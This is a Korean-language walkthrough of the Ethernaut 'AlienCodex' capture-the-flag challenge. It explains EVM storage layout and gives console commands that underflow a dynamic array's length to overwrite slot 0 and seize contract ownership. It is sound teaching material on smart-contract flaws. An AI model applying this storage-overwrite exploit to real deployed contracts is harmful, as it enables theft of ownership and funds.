# 문제 코드
---
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
> 이 컨트랙트의 소유권을 획득하라.

# 풀이
---
## EVM Storage
---
문제 풀이에 앞서 **EVM Storage**에 대해 알아보자. EVM Storage는 `uint256 slot 번호 -> 32 바이트 값`으로 구성된다. `slot` 번호는 다음과 같은 규칙으로 정해진다.

```
일반 상태변수 -> 선언 순서대로 slot 배정
작은 타입     -> 같은 slot에 packing 가능
고정 배열     -> 시작 slot부터 연속 저장
동적 배열     -> slot에는 length, 원소는 keccak256(slot)부터 저장 // arry(n) => keccak256(slot) + n
mapping       -> keccak256(key, slot)에 값 저장
struct        -> 필드 순서대로 slot 배정, packing 가능
bytes/string  -> 짧으면 같은 slot, 길면 keccak256(slot) 영역 사용
```

## 문제 풀이
---
본 문제 컨트랙트를 살펴보면 `retract()` 함수를 통해 동적 배열의 길이를 줄일 수 있다. 이 함수를 사용해서 배열 길이에 대한 언더플로우를 발생시키면 `0 ~ (2^256 - 1)` 범위의 storage slot 접근이 가능해진다. 우선 `retract()`를 호출하기 전에 `makeContract()`를 호출하여 제어자에 의한 `assert()`를 우회하자.

`retract()`를 호출하여 언더플로우를 발생시켰다면, 다음 과정은 컨트랙트의 소유권을 가져오는 것이다. `await web3.eth.getStorageAt(contract.address, 0);'을 통해 `slot 0`에는 `bool` 타입의 `contact`와 소유자의 주소가 packing되어 있음을 확인할 수 있다. 따라서 `revise()` 함수의 인자 `i`에는 동적 배열 `codex`를 기준으로한 `slot 0`의 인덱스를, 인자 `\_content`에는 `0x000000000000000000000001playerAddress`를 넘겨 해당 slot의 값을 변경해야 한다.

앞서 설명한 EVM Storage 구조를 참고하면 `codex`는 `slot 1`에 배열의 길이를 저장하고, `keccak256(1)`부터 각 원소를 저장한다. 그리고 EVM storage에 존재하는 `slot n`에 대해서 `base + n's index ≡ n's slot (mod 2^256)`이 성립해야 한다. 따라서 `targetIndex = targetSlot - keccak256(arraySlot) mod 2^256`의 식을 통해 `slot 0`의 인덱스를 찾을 수 있다.

다음은 풀이에 사용된 콘솔 명령어다.

```javaScript
await contract.retract()

const arraySlot = 1;
const max = web3.utils.toBN(2).pow(web3.utils.toBN(256));
const base = web3.utils.toBN(web3.utils.soliditySha3({ type: "uint256", value: arraySlot }));
const index // = 0 - base mod max
            // = - base mod max
            = max.sub(base)

await contract.revise(index.toString(), "0x000000000000000000000001playerAddress");
```
